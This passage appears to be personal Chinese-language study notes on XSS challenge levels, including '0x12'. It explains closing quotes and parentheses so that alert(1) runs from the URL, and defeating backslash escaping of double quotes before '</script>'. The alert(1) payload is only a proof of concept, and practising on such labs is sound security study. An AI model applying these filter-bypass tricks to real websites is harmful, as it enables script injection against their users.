在`url`中要出现`alert(1);`这个语句，于是闭合前面的`("` 和后面的`")` ，虽然有那么一大堆过滤策略，但居然过了？？？？

![截图录屏_选择区域_20200603225231](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603225231.png)

0x12

输入"，会被转义成`\"`，log中有两个"要对付，后一个直接注释掉，前一个输出两个\，将\本身转义，然后输出"，将\以字符串的形式 输出，不会注释掉`</script>`?????

![截图录屏_选择区域_20200603225312](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603225312.png)

还有，不用转义，直接使用"闭合也行??????

![截图录屏_选择区域_20200603225420](/home/garlic/Desktop/笔记/picture/截图录屏_选择区域_20200603225420.png)

